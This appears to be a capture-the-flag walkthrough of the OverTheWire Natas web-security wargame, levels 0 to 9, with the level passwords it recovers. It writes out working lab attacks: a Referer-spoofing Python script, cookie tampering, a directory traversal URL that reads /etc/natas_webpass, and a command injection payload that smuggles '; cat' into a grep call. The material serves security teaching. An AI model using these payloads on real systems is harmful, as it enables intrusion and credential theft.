# Natas

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at `http://natasX.natas.labs.overthewire.org`, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in `/etc/natas_webpass/`. E.g. the password for `natas5` is stored in the file `/etc/natas_webpass/natas5` and only readable by natas4 and natas5.

Start here:

> Username: natas0
> 
> Password: natas0
> 
> URL:      http://natas0.natas.labs.overthewire.org


## 1. Natas 0

After successful login, to level 0, the following information is found:
![](images/natas/natas0a.jpg)

Looking at the source code and the password for level 1 is there ie : 
```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## 2. Natas 1

> Username: natas1
> 
> Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
> 
>  URL: http://natas1.natas.labs.overthewire.org

In this level, right clicking has been blocked but one can still be able to view the source code by using the shortcut `Ctrl+U`

```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## 3. Natas 2

> Username: natas2
> 
> Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
> 
> URL: http://natas2.natas.labs.overthewire.org

In this level, the page notifies that `There is nothing on this page `, checking the source code there is an image in the files directory, adding the files directory to the link
```
http://natas2.natas.labs.overthewire.org/files
```
This brings out 2 files ie `pixel.png` and `users.txt`. The pixel.png file has an image whereas the users.txt file brings usernames and passwords for several users of which one of the users is natas3
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
**natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14**
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## 4. Natas 3

> Username: natas3
> 
> Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
> 
> URL: http://natas3.natas.labs.overthewire.org

On this page, there are no hints on anything as in the previous level but most web pages contain a `robots.txt` file which can let us know on the pages that are disallowed.

The following is the what is gotten from `http://natas3.natas.labs.overthewire.org/robots.txt`:
```
User-agent: *
Disallow: /s3cr3t/
```

Going to the /s3cr3t/ page, there's a `users.txt` file that has login details for level 4
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## 5. Natas 4

> Username: natas4
> 
> Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
> 
> URL: http://natas4.natas.labs.overthewire.org

After logging in, the following error is received
```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

One can write a simple python script that will change the _referer_ of the request from natas4 to natas5 and login as natas4 ie:
```python
import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
s.headers.update({'referer':referer})
r = s.get(url)

print(r.text)
```

Running this outputs the following:
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

The password for level 5 is 
```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## Natas 5

> Username: natas5
> 
> Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
> 
> URL: http://natas5.natas.labs.overthewire.org

In this level, Access is disallowed because we are not logged in.

A simple script can be written to check the headers of the response of the page:
```python
import requests

url = "http://natas5.natas.labs.overthewire.org/"
s = requests.Session()
s.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
r = s.get(url)

print(r.headers)
```

After running the following is the response after running the python script
```
{'Content-Length': '367', 'Content-Encoding': 'gzip', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.10 (Debian)', 'Connection': 'Keep-Alive', 'Date': 'Fri, 10 Sep 2021 10:25:14 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
```

A hint is seen on the cookie as the cookie is set to `0` meaning that we are logged out. This can be changed using the console by typing 
```console
document.cookie = "loggedin=1
```

Reload the page, and we are logged in and the following is given:
```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Natas 6

> Username: natas6
> 
> Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
> 
> URL: http://natas6.natas.labs.overthewire.org/

The page has an input option with a `view sourcecode` button that opens us a php source code page that has the following:
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

From the above, this shows that there is a page ie `/includes/secret.inc` that can be viewed. 

The page is blank but the source code contains:
```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Enter the secret in the input secret option on the page and submit. The output of this will be:
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Natas 7

> Username: natas7
> 
> Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
> 
> URL: http://natas7.natas.labs.overthewire.org/

On logging in the page has the following pages in it:
![](images/natas/natas7a.png)

When clicking the page, eg `about` page, the link is `http://natas7.natas.labs.overthewire.org/index.php?page=about` 

From the onset, the password we know it should be in `/etc/natas_webpass/natas8` hence a directory traversal can be done to find the passowrd using:
```
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
```

The password is now displayed:
```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```

## Natas 8

> Username: natas8
> 
> Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
> 
> URL http://natas8.natas.labs.overthewire.org/

![](images/natas/natas8a.png)
In this level, we get an input page and a button `"View sourcecode"` that gives us the pages source code.

The source code also has a php code embedded in it.

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

With the above, the input should be equal to **3d3d516343746d4d6d6c315669563362** but is modified in the encodeSecret.

This can be reversed by a simple python script;
```python
import base64
secret = "3d3d516343746d4d6d6c315669563362"
secret = bytes.fromhex(secret)
secret = secret[::-1]
secret = base64.decodebytes(secret)
print(secret)
```

The output of running for this is `oubWYf2kBq`. Input this in the `Input secret` method. Tjos returns the password for level 9 as:
```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
```

## Natas9

> Username: natas8
> 
> Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
> 
> URL http://natas9.natas.labs.overthewire.org/

In this level we get the following php code
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

With this then there is command injection in the input field so if we input `; cat /etc/natas_webpass/natas10` in the search field then we get the password since the ` ; ` separates commands in a shell.

The password is:
```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

